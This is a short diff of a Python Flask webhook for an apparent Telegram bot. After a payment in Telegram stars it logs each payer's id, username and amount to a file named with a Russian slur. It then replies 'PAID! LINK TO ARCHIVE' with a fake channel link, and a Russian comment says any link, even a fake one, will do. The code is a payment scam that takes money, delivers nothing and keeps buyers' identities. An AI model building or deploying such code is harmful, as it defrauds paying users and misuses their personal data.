@@ -1,6 +1,6 @@
 from flask import Flask, request
 import requests
-import json  # <---------- ЭТО ДОБАВИЛ!
+import json
 from datetime import datetime
 
 app = Flask(__name__)
@@ -41,7 +41,7 @@ def webhook():
         with open("pediki.txt", "a") as f:
             f.write(f"{datetime.now()} | {user.get('id')} | @{user.get('username')} | {amount}⭐\n")
         
-        # КИДАЕМ ЕМУ ЛЮБУЮ ССЫЛКУ (ХОТЬ ФЕЙКОВУЮ)
+        # КИДАЕМ ЕМУ ЛЮБУЮ ССЫЛКУ
         send_message(msg['chat']['id'],
             f"✅ ОПЛАЧЕНО! ССЫЛКА НА АРХИВ:\nhttps://t.me/joinchat/FAKE_CHANNEL",
             None)
